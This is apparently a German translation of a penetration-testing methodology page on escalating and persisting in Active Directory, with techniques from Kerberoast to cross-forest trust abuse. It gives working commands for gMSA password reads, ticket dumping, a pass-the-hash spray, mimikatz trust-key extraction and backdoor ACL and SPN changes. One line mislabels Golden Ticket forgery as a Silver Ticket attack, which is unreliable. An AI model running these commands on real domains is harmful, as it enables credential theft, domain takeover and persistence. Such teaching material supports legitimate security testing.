Ein fehlgeschlagener default/NTLM-Bind **entkräftet** diesen Befund nicht: Teste mit `-k`, einem FQDN, der zur DC aufgelöst wird, und einer mit dem KDC synchronisierten Uhr. Erfolgreiche Modulläufe schreiben Kandidatenlisten und erworbene ccaches unter `~/.nxc/modules/pre2k/`.<sup>[[18]](#references)[[20]](#references)</sup>

Untersuche nach der Kompromittierung des Computer-Principals dessen verschachtelte Gruppenmitgliedschaften und ausgehenden Berechtigungen. Insbesondere können Principals, die im Sicherheitsdeskriptor `msDS-GroupMSAMembership` eines gMSA aufgeführt sind, `msDS-ManagedPassword` lesen; die Ausgabe von NetExec mit `--gmsa` zeigt die autorisierten Principals und gibt den aktuellen NT-Hash zurück, wenn der authentifizierende Computer autorisiert ist.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```

Bewerte die wiederhergestellte gMSA anschließend wie jedes andere Credential: Prüfe die lokale und Domänengruppenmitgliedschaft, Anmelderechte, SPNs, Delegation und erreichbare Dienste, bevor du pass-the-hash ausprobierst. Dieser ACL-basierte Abrufpfad unterscheidet sich von [Golden gMSA/dMSA](golden-dmsa-gmsa.md), bei dem verwaltete Passwörter nach einer Kompromittierung des KDS-Root-Keys abgeleitet werden.<sup>[[20]](#references)</sup>

Ein Computerprincipal kann auch ausgehende Kontrolle über andere Computerobjekte oder Gruppen haben. Nachdem du einen solchen Principal erlangt hast, prüfe seine verschachtelten Mitgliedschaften und effektiven ACLs separat: Ein Schreibrecht auf ein anderes Computerobjekt kann eine Kontoänderung ermöglichen, und Gruppenmitgliedschaftsrechte können zu einer Anmelderolle führen. Ein Flag für ein bereitgestelltes Konto, eine vorhersehbare Namenskonvention oder eine `GenericWrite`-Kante allein belegt nicht den vollständigen Angriffsweg.

Eine lesbare Kopie eines `msDS-ManagedPassword`-Blobs in einer Datei, Freigabe oder einem Backup stellt einen separaten Angriffsweg dar: Die LDAP-Lese-ACL kann eine an anderer Stelle gespeicherte Kopie nicht schützen. Verifiziere, dass es sich bei den Daten um einen Managed-Password-Blob handelt, bevor du sie interpretierst, und unterscheide diesen Fall sowohl von einem autorisierten LDAP-Lesezugriff als auch von der Ableitung über den KDS-Root-Key.

### Kerberoast

Kerberoasting beinhaltet das Abrufen von **TGS-Tickets**, die von an Benutzerkonten gebundenen Diensten verwendet werden, und das **Offline**-Knacken ihrer Verschlüsselung, die auf Benutzerpasswörtern basiert.

Mehr dazu:

{{#ref}}
kerberoast.md
{{#endref}}

### Remote-Verbindung (RDP, SSH, FTP, Win-RM usw.)

Sobald du einige Credentials erlangt hast, kannst du prüfen, ob du Zugriff auf eine **Maschine** hast. Dazu kannst du **CrackMapExec** verwenden, um entsprechend deinen Portscans mit verschiedenen Protokollen Verbindungen zu mehreren Servern herzustellen.

### Lokale Rechteausweitung

Wenn du kompromittierte Credentials oder eine Sitzung als regulärer Domänenbenutzer hast und auf **eine beliebige Maschine in der Domäne** zugreifen kannst, suche nach einem Weg, **lokal deine Rechte auszuweiten und Credentials zu sammeln**. Lokale Administratorrechte können es dir ermöglichen, **die Hashes anderer Benutzer** aus dem Arbeitsspeicher (LSASS) und dem lokalen Speicher (SAM) **zu dumpen**.

Dieses Buch enthält eine vollständige Seite zur [**lokalen Rechteausweitung unter Windows**](../windows-local-privilege-escalation/index.html) und eine [**Checkliste**](../checklist-windows-privilege-escalation.md). Denk außerdem daran, [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) zu verwenden.

### Tickets der aktuellen Sitzung

Es ist sehr **unwahrscheinlich**, dass du **Tickets** in der aktuellen Sitzung des Benutzers findest, die dir **Zugriff auf** unerwartete Ressourcen **gewähren**. Prüfen kannst du es aber:

```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```

### NTLM Relay

Mit Domain-Zugangsdaten oder einer Benutzersitzung solltest du NTLM-[**Relay-Angriffe**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) erneut untersuchen: Authentifizierte Enumeration und Coercion-Techniken können Relay-Pfade aufdecken, die bei der nicht authentifizierten Reconnaissance nicht verfügbar waren.

### Nach Zugangsdaten in Computerfreigaben | SMB-Freigaben suchen

Da du jetzt über einige grundlegende Zugangsdaten verfügst, solltest du prüfen, ob du **interessante Dateien in der AD-Freigabe finden** kannst. Du könntest das manuell tun, aber es ist eine sehr langweilige, repetitive Aufgabe (und noch mehr, wenn du Hunderte von Dokumenten findest, die du überprüfen musst).

[**Folge diesem Link, um mehr über geeignete Tools zu erfahren.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### NTLM-Creds stehlen

Wenn du **auf andere PCs oder Freigaben zugreifen** kannst, könntest du **Dateien platzieren** (zum Beispiel eine SCF-Datei), die, wenn auf sie zugegriffen wird, **eine NTLM-Authentifizierung gegen dich auslösen**, sodass du die **NTLM-Challenge stehlen** und cracken kannst:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Diese Schwachstelle ermöglichte es jedem authentifizierten Benutzer, den **Domain Controller zu kompromittieren**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege Escalation in Active Directory MIT privilegierten Zugangsdaten/einer privilegierten Sitzung

**Für die folgenden Techniken reicht ein regulärer Domain-Benutzer nicht aus; du benötigst spezielle Berechtigungen/Zugangsdaten, um diese Angriffe durchzuführen.**

### Hashes extrahieren

Hoffentlich ist es dir gelungen, ein **lokales Admin-Konto zu kompromittieren**, indem du [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) einschließlich Relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md) oder [lokale Privilege Escalation](../windows-local-privilege-escalation/index.html) genutzt hast.\
Dann ist es an der Zeit, alle Hashes aus dem Arbeitsspeicher und lokal zu dumpen.\
[**Lies diese Seite über verschiedene Methoden, um an die Hashes zu gelangen.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Sobald du den Hash eines Benutzers hast**, kannst du ihn verwenden, um dich als dieser Benutzer **auszugeben**.\
Du benötigst ein **Tool**, das die **NTLM-Authentifizierung mit diesem Hash durchführt**, **oder** du kannst eine neue **sessionlogon** erstellen und den **Hash** in die **LSASS** injizieren, sodass dieser **Hash bei jeder NTLM-Authentifizierung verwendet wird.** Letzteres macht mimikatz.\
[**Lies diese Seite für weitere Informationen.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Dieser Angriff zielt darauf ab, **den NTLM-Hash des Benutzers zu verwenden, um Kerberos-Tickets anzufordern** und stellt somit eine Alternative zum üblichen Pass The Hash über das NTLM-Protokoll dar. Daher kann dies besonders **nützlich in Netzwerken sein, in denen das NTLM-Protokoll deaktiviert ist** und nur **Kerberos als Authentifizierungsprotokoll zugelassen ist**.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Bei der Angriffsmethode **Pass The Ticket (PTT)** **stehlen Angreifer das Authentifizierungsticket eines Benutzers** statt dessen Passwort oder Hash-Werte. Dieses gestohlene Ticket wird dann verwendet, um sich **als der Benutzer auszugeben** und unbefugten Zugriff auf Ressourcen und Dienste innerhalb eines Netzwerks zu erhalten.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Zugangsdaten wiederverwenden

Wenn du den **Hash** oder das **Passwort** eines **lokalen Administrators** hast, solltest du versuchen, dich damit **lokal** bei anderen **PCs** anzumelden.

```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```

> [!WARNING]
> Beachte, dass dies ziemlich **noisy** ist und **LAPS** dies **mitigieren** würde.

### MSSQL-Missbrauch & vertrauenswürdige Verknüpfungen

Wenn ein Benutzer über Berechtigungen verfügt, auf **MSSQL-Instanzen zuzugreifen**, kann er möglicherweise **Befehle** auf dem MSSQL-Host **ausführen** (wenn die Instanz als SA läuft), den NetNTLM-**Hash** **stehlen** oder sogar einen **Relay-Angriff** durchführen.\
Wenn eine MSSQL-Instanz über einen Datenbank-Link mit einer anderen Instanz als vertrauenswürdig eingestuft wird, kann ein Benutzer mit Berechtigungen für die verknüpfte Datenbank möglicherweise **die Vertrauensbeziehung nutzen, um Abfragen auf der anderen Instanz auszuführen**. Diese Vertrauensbeziehungen lassen sich verketten und können schließlich zu einer falsch konfigurierten Datenbank führen, auf der der Benutzer Befehle ausführen kann.\
**Die Verknüpfungen zwischen Datenbanken funktionieren auch über Forest Trusts hinweg.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Missbrauch von IT-Asset- und Deployment-Plattformen

Inventarisierungs- und Deployment-Suites von Drittanbietern bieten oft mächtige Wege zu Zugangsdaten und Codeausführung. Siehe:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Uneingeschränkte Delegierung

Wenn du ein Computer-Objekt mit dem Attribut [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) findest und über Domain-Berechtigungen auf dem Computer verfügst, kannst du die TGTs aller Benutzer, die sich am Computer anmelden, aus dem Speicher auslesen.\
Wenn sich also ein **Domain Admin am Computer anmeldet**, kannst du dessen TGT auslesen und dich mithilfe von [Pass the Ticket](pass-the-ticket.md) als dieser Benutzer ausgeben.\
Dank eingeschränkter Delegierung könntest du sogar **automatisch einen Print Server kompromittieren** (hoffentlich handelt es sich dabei um einen DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Eingeschränkte Delegierung

Wenn ein Benutzer oder Computer für „Constrained Delegation“ zugelassen ist, kann er sich **als beliebiger Benutzer ausgeben, um auf bestimmte Dienste auf einem Computer zuzugreifen**.\
Wenn du dann den **Hash** dieses Benutzers oder Computers **kompromittierst**, kannst du dich **als beliebiger Benutzer** (auch als Domain Admin) **ausgeben**, um auf bestimmte Dienste zuzugreifen.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Ressourcenbasierte eingeschränkte Delegierung

Wenn du über **WRITE**-Berechtigungen für ein Active Directory-Objekt eines Remote-Computers verfügst, kannst du Code mit **erweiterten Berechtigungen** ausführen:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Missbrauch von Berechtigungen/ACLs

Der kompromittierte Benutzer könnte über **interessante Berechtigungen für bestimmte Domain-Objekte** verfügen, mit denen du dich lateral **bewegen** oder deine Berechtigungen **eskalieren** kannst.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Missbrauch des Printer Spooler-Dienstes

Wenn du einen **Spool-Dienst entdeckst, der innerhalb der Domain lauscht**, kann dieser **missbraucht** werden, um **neue Zugangsdaten zu erhalten** und **Berechtigungen zu eskalieren**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Missbrauch von Sitzungen Dritter

Wenn **andere Benutzer** auf den **kompromittierten** Computer **zugreifen**, ist es möglich, **Zugangsdaten aus dem Speicher auszulesen** und sogar **Beacons in ihre Prozesse einzuschleusen**, um sich als diese Benutzer auszugeben.\
Benutzer greifen normalerweise über RDP auf das System zu. Hier erfährst du, wie du einige Angriffe auf RDP-Sitzungen Dritter durchführst:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** bietet ein System zur Verwaltung des **lokalen Administratorpassworts** auf domain-verbundenen Computern und stellt sicher, dass es **zufällig generiert**, eindeutig und regelmäßig **geändert** wird. Diese Passwörter werden in Active Directory gespeichert; der Zugriff darauf wird über ACLs auf autorisierte Benutzer beschränkt. Mit ausreichenden Berechtigungen für den Zugriff auf diese Passwörter ist ein Pivot zu anderen Computern möglich.


{{#ref}}
laps.md
{{#endref}}

### Zertifikatsdiebstahl

Informationen zur AD CS-Registrierung, Zertifikatszuordnung und Enumeration, bevor du Zertifikate stiehlst oder Templates missbrauchst, findest du in der [Übersicht zu AD-Zertifikaten](ad-certificates.md).

**Zertifikate** vom kompromittierten Computer **zusammenzutragen**, könnte eine Möglichkeit sein, deine Berechtigungen innerhalb der Umgebung zu eskalieren:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Missbrauch von Zertifikat-Templates

Wenn **verwundbare Templates** konfiguriert sind, ist es möglich, sie zu missbrauchen, um Berechtigungen zu eskalieren:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-Exploitation mit einem Konto mit hohen Berechtigungen

### Auslesen von Domain-Zugangsdaten

Sobald du über **Domain Admin**- oder noch besser **Enterprise Admin**-Berechtigungen verfügst, kannst du die **Domain-Datenbank** _ntds.dit_ **auslesen**.

[**Weitere Informationen zum DCSync-Angriff findest du hier**](dcsync.md).

[**Weitere Informationen zum Stehlen der NTDS.dit findest du hier**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

Ein lesbares Backup-Archiv mit `ntds.dit` und der `SYSTEM`-Hive sollte als offengelegtes Verzeichnismaterial betrachtet werden, noch bevor es extrahiert wird. Ein veralteter Passwort-Hash bedeutet nicht, dass andere Objektattribute sicher sind: Felder wie `description` können Zugangsdaten oder operative Notizen enthalten. Prüfe zuerst die Namen der Archivmitglieder und gib den Inhalt der extrahierten Datenbank nicht routinemäßig bei der Enumeration aus.

### Privesc als Persistence

Einige der zuvor besprochenen Techniken können für Persistence verwendet werden.\
Du könntest zum Beispiel:

- Benutzer für [**Kerberoast**](kerberoast.md) verwundbar machen

  ```bash
  Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
  ```

- Mache Benutzer anfällig für [**ASREPRoast**](asreproast.md)

  ```bash
  Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
  ```

- Gewähre einem Benutzer [**DCSync**](#dcsync)-Berechtigungen

  ```bash
  Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
  ```

### Silver Ticket

Der **Silver Ticket-Angriff** erstellt mithilfe des **NTLM-Hashes** (zum Beispiel des **Hashes des Computerkontos**) ein **legitimes Ticket Granting Service (TGS)-Ticket** für einen bestimmten Dienst. Mit dieser Methode lassen sich **die Berechtigungen des Dienstes nutzen**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Bei einem **Golden Ticket-Angriff** verschafft sich ein Angreifer Zugriff auf den **NTLM-Hash des krbtgt-Kontos** in einer Active Directory (AD)-Umgebung. Dieses Konto ist besonders, weil es zum Signieren aller **Ticket Granting Tickets (TGTs)** verwendet wird, die für die Authentifizierung im AD-Netzwerk erforderlich sind.

Sobald der Angreifer diesen Hash erhält, kann er **TGTs** für beliebige Konten erstellen (Silver Ticket-Angriff).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Diese Tickets ähneln Golden Tickets, werden jedoch so gefälscht, dass sie **gängige Erkennungsmechanismen für Golden Tickets umgehen.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Persistence über Zertifikate eines Kontos**

**Besitzt man Zertifikate eines Kontos oder kann sie anfordern,** ist das eine sehr gute Möglichkeit, im Benutzerkonto persistent zu bleiben (selbst wenn der Benutzer sein Passwort ändert):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Persistence über Zertifikate in der Domäne**

**Mit Zertifikaten lässt sich auch mit hohen Berechtigungen innerhalb der Domäne Persistence erreichen:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Das **AdminSDHolder**-Objekt in Active Directory schützt **privilegierte Gruppen** (wie Domain Admins und Enterprise Admins), indem es auf diese Gruppen eine standardisierte **Access Control List (ACL)** anwendet, um unbefugte Änderungen zu verhindern. Diese Funktion lässt sich jedoch ausnutzen: Ändert ein Angreifer die ACL von AdminSDHolder so, dass ein normaler Benutzer Vollzugriff erhält, kann dieser Benutzer umfassend alle privilegierten Gruppen kontrollieren. Diese Schutzmaßnahme kann sich somit ins Gegenteil verkehren und unberechtigten Zugriff ermöglichen, wenn sie nicht genau überwacht wird.

[**Weitere Informationen zur AdminDSHolder Group findest du hier.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Auf jedem **Domain Controller (DC)** gibt es ein **lokales Administratorkonto**. Mit Administratorrechten auf einem solchen Rechner kann der Hash des lokalen Administrators mithilfe von **mimikatz** ausgelesen werden. Anschließend muss die Registry geändert werden, um **die Verwendung dieses Passworts zu aktivieren** und so Remotezugriff auf das lokale Administratorkonto zu ermöglichen.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Du kannst einem **Benutzer** **spezielle Berechtigungen** für bestimmte Domänenobjekte **erteilen**, mit denen der Benutzer **später seine Berechtigungen erweitern kann**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security Descriptors** werden verwendet, um die **Berechtigungen** zu **speichern**, die ein **Objekt** **für** ein **Objekt** **hat**. Wenn du eine **kleine Änderung** am **Security Descriptor** eines Objekts **vornehmen** kannst, erhältst du möglicherweise sehr interessante Berechtigungen für dieses Objekt, ohne Mitglied einer privilegierten Gruppe sein zu müssen.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Missbrauche die Hilfsklasse `dynamicObject`, um kurzlebige Principals/GPOs/DNS-Einträge mit `entryTTL`/`msDS-Entry-Time-To-Die` zu erstellen. Sie löschen sich selbst, ohne Tombstones zu hinterlassen, und löschen so LDAP-Beweise, während verwaiste SIDs, fehlerhafte `gPLink`-Referenzen oder zwischengespeicherte DNS-Antworten zurückbleiben (z. B. eine Verschmutzung der AdminSDHolder-ACEs oder bösartige `gPCFileSysPath`-/AD-integrierte DNS-Umleitungen).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Verändere **LSASS** im Arbeitsspeicher, um ein **universelles Passwort** einzurichten, das Zugriff auf alle Domänenkonten gewährt.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Hier erfährst du, was ein SSP (Security Support Provider) ist.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Du kannst deinen **eigenen SSP** erstellen, um die für den Zugriff auf den Computer verwendeten **Credentials** im **Klartext** **abzufangen**.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Dabei wird ein **neuer Domain Controller** im AD registriert und verwendet, um **Attribute** (SIDHistory, SPNs ...) auf angegebenen Objekten zu **setzen**, ohne **Logs** zu den **Änderungen** zu hinterlassen. Dafür sind **DA**-Berechtigungen erforderlich, außerdem musst du dich innerhalb der **Root-Domäne** befinden.\
Beachte, dass bei falschen Daten ziemlich unschöne Logs entstehen.

{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Wir haben zuvor besprochen, wie sich Berechtigungen erweitern lassen, wenn du **über ausreichende Berechtigungen zum Lesen von LAPS-Passwörtern verfügst**. Diese Passwörter lassen sich jedoch auch nutzen, um **Persistence aufrechtzuerhalten**.\
Siehe:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft betrachtet den **Forest** als Sicherheitsgrenze. Das bedeutet, dass **die Kompromittierung einer einzelnen Domäne potenziell zur Kompromittierung des gesamten Forests führen kann**.<sup>[[1]](#references)</sup>

### Grundlegende Informationen

Ein [**Domain Trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) ist ein Sicherheitsmechanismus, der einem Benutzer aus einer **Domäne** den Zugriff auf Ressourcen in einer anderen **Domäne** ermöglicht. Er verknüpft im Wesentlichen die Authentifizierungssysteme der beiden Domänen und ermöglicht so den nahtlosen Austausch von Authentifizierungsprüfungen. Wenn Domänen einen Trust einrichten, tauschen sie bestimmte **Schlüssel** aus und speichern diese in ihren **Domain Controllern (DCs)**. Diese Schlüssel sind entscheidend für die Integrität des Trusts.

In einem typischen Szenario muss ein Benutzer, der auf einen Dienst in einer **vertrauenswürdigen Domäne** zugreifen möchte, zunächst beim DC seiner eigenen Domäne ein spezielles Ticket namens **Inter-Realm-TGT** anfordern. Dieses TGT wird mit einem gemeinsamen **Schlüssel** verschlüsselt, auf den sich beide Domänen geeinigt haben. Anschließend legt der Benutzer dieses TGT beim **DC der vertrauenswürdigen Domäne** vor, um ein Service-Ticket (**TGS**) zu erhalten. Nachdem der DC der vertrauenswürdigen Domäne das Inter-Realm-TGT erfolgreich überprüft hat, stellt er ein TGS aus, das dem Benutzer Zugriff auf den Dienst gewährt.

**Schritte**:

1. Ein **Clientcomputer** in **Domäne 1** startet den Vorgang, indem er mit seinem **NTLM-Hash** beim **Domain Controller (DC1)** ein **Ticket Granting Ticket (TGT)** anfordert.
2. DC1 stellt ein neues TGT aus, wenn die Authentifizierung des Clients erfolgreich ist.
3. Anschließend fordert der Client bei DC1 ein **Inter-Realm-TGT** an, das für den Zugriff auf Ressourcen in **Domäne 2** benötigt wird.
4. Das Inter-Realm-TGT wird mit einem **Trust-Schlüssel** verschlüsselt, den DC1 und DC2 im Rahmen des zweiseitigen Domain Trusts gemeinsam nutzen.
5. Der Client übermittelt das Inter-Realm-TGT an den **Domain Controller von Domäne 2 (DC2)**.
6. DC2 überprüft das Inter-Realm-TGT mit dem gemeinsamen Trust-Schlüssel und stellt bei gültigem Ticket ein **Ticket Granting Service (TGS)** für den Server in Domäne 2 aus, auf den der Client zugreifen möchte.
7. Schließlich übermittelt der Client dieses TGS an den Server. Das TGS ist mit dem Hash des Serverkontos verschlüsselt und ermöglicht den Zugriff auf den Dienst in Domäne 2.

### Verschiedene Trusts

Wichtig ist, dass ein **Trust einseitig oder zweiseitig sein kann**. Bei einer zweiseitigen Beziehung vertrauen sich beide Domänen gegenseitig. Bei einem **einseitigen** Trust ist eine Domäne die **vertrauenswürdige** und die andere die **vertrauende** Domäne. In diesem Fall kannst du **nur von der vertrauenswürdigen Domäne aus auf Ressourcen innerhalb der vertrauenden Domäne zugreifen**.

Wenn Domäne A Domäne B vertraut, ist A die vertrauende und B die vertrauenswürdige Domäne. Außerdem handelt es sich in **Domäne A** um einen **Outbound Trust** und in **Domäne B** um einen **Inbound Trust**.

**Verschiedene Trust-Beziehungen**

- **Parent-Child Trusts**: Dies ist eine gängige Konfiguration innerhalb desselben Forests, bei der eine untergeordnete Domäne automatisch einen zweiseitigen transitiven Trust zu ihrer übergeordneten Domäne hat. Dadurch können Authentifizierungsanfragen nahtlos zwischen übergeordneter und untergeordneter Domäne weitergeleitet werden.
- **Cross-Link Trusts**: Diese werden auch als „Shortcut Trusts“ bezeichnet und zwischen untergeordneten Domänen eingerichtet, um Weiterleitungen zu beschleunigen. In komplexen Forests müssen Authentifizierungsverweise üblicherweise bis zum Forest-Root und dann zur Zieldomäne weitergeleitet werden. Durch Cross-Links wird dieser Weg verkürzt, was besonders in geografisch verteilten Umgebungen nützlich ist.
- **External Trusts**: Diese werden zwischen unterschiedlichen, nicht verwandten Domänen eingerichtet und sind nicht transitiv. Laut der [Dokumentation von Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) sind External Trusts nützlich, um auf Ressourcen in einer Domäne außerhalb des aktuellen Forests zuzugreifen, die nicht über einen Forest Trust verbunden ist. SID Filtering erhöht die Sicherheit bei External Trusts.
- **Tree-Root Trusts**: Diese Trusts werden automatisch zwischen der Forest-Root-Domäne und einer neu hinzugefügten Tree-Root-Domäne eingerichtet. Obwohl sie nicht häufig vorkommen, sind Tree-Root Trusts wichtig, um neue Domänenbäume zu einem Forest hinzuzufügen. Sie ermöglichen diesen einen eindeutigen Domänennamen und gewährleisten eine zweiseitige Transitivität. Weitere Informationen findest du im [Leitfaden von Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Dieser Trust-Typ ist ein zweiseitiger transitiver Trust zwischen zwei Forest-Root-Domänen. Zur Verbesserung der Sicherheit wird auch SID Filtering erzwungen.
- **MIT Trusts**: Diese Trusts werden mit Nicht-Windows-Kerberos-Domänen eingerichtet, die [RFC4120-konform](https://tools.ietf.org/html/rfc4120) sind. MIT Trusts sind etwas spezialisierter und eignen sich für Umgebungen, die eine Integration mit Kerberos-basierten Systemen außerhalb des Windows-Ökosystems erfordern.

#### Weitere Unterschiede bei **Trust-Beziehungen**

- Eine Trust-Beziehung kann **transitiv** sein (A vertraut B, B vertraut C, dann vertraut A auch C) oder **nicht transitiv**.
- Eine Trust-Beziehung kann als **bidirektionaler Trust** (beide vertrauen einander) oder als **unidirektionaler Trust** (nur eine Domäne vertraut der anderen) eingerichtet werden.

### Angriffspfad

1. Die Trust-Beziehungen **enumerieren**
2. Prüfen, ob ein **Security Principal** (Benutzer/Gruppe/Computer) **Zugriff** auf Ressourcen der **anderen Domäne** hat, beispielsweise über ACE-Einträge oder durch Mitgliedschaft in Gruppen der anderen Domäne. Suche nach **domänenübergreifenden Beziehungen** (der Trust wurde wahrscheinlich dafür eingerichtet).
   1. In diesem Fall könnte Kerberoasting eine weitere Option sein.
3. Die **Konten kompromittieren**, mit denen sich zwischen Domänen **pivotieren** lässt.

Angreifer können auf drei Arten auf Ressourcen in einer anderen Domäne zugreifen:

- **Mitgliedschaft in lokalen Gruppen**: Principals können lokalen Gruppen auf Rechnern hinzugefügt werden, beispielsweise der Gruppe „Administrators“ auf einem Server. Dadurch erhalten sie weitreichende Kontrolle über diesen Rechner.
- **Mitgliedschaft in Gruppen einer fremden Domäne**: Principals können auch Mitglieder von Gruppen in der fremden Domäne sein. Die Wirksamkeit dieser Methode hängt jedoch von der Art des Trusts und dem Geltungsbereich der Gruppe ab.
- **Access Control Lists (ACLs)**: Principals können in einer **ACL** aufgeführt sein, insbesondere als Einträge in **ACEs** innerhalb einer **DACL**, wodurch sie Zugriff auf bestimmte Ressourcen erhalten. Wer sich näher mit der Funktionsweise von ACLs, DACLs und ACEs befassen möchte, findet im Whitepaper „[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)“ eine wertvolle Ressource.<sup>[[17]](#references)</sup>

### Externe Benutzer/Gruppen mit Berechtigungen finden

Du kannst **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** überprüfen, um fremde Security Principals in der Domäne zu finden. Dabei handelt es sich um Benutzer/Gruppen aus **einer externen Domäne/einem externen Forest**.

Du kannst dies in **Bloodhound** oder mit powerview überprüfen:

```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```

### Child-to-Parent forest privilege escalation

```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```

Weitere Möglichkeiten, Domänenvertrauensstellungen aufzuzählen:

```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```

> [!WARNING]
> Es gibt **2 vertrauenswürdige Schlüssel**: einen für _Child --> Parent_ und einen für _Parent_ --> _Child_.\
> Mit folgendem Befehl können Sie den vom aktuellen Domain verwendeten Schlüssel anzeigen:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Mit SID-History Injection als Enterprise-Admin in die Child-/Parent-Domain eskalieren und dabei die Trust-Beziehung ausnutzen:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Schreibbare Configuration NC ausnutzen

Es ist entscheidend zu verstehen, wie die Configuration Naming Context (NC) ausgenutzt werden kann. Die Configuration NC dient in Active Directory (AD)-Umgebungen als zentrales Repository für Konfigurationsdaten einer Forest. Diese Daten werden auf jeden Domain Controller (DC) innerhalb der Forest repliziert. Schreibbare DCs verfügen dabei über eine beschreibbare Kopie der Configuration NC. Um dies auszunutzen, benötigt man **SYSTEM-Berechtigungen auf einem DC**, vorzugsweise einem Child-DC.

**GPO mit dem Standort des Root-DC verknüpfen**

Der Container Sites in der Configuration NC enthält Informationen zu den Standorten aller in die AD-Forest eingebundenen Computer. Mit SYSTEM-Berechtigungen auf einem beliebigen DC können Angreifer GPOs mit den Standorten der Root-DCs verknüpfen. Dadurch kann die Root-Domain kompromittiert werden, indem die auf diese Standorte angewendeten Richtlinien manipuliert werden.

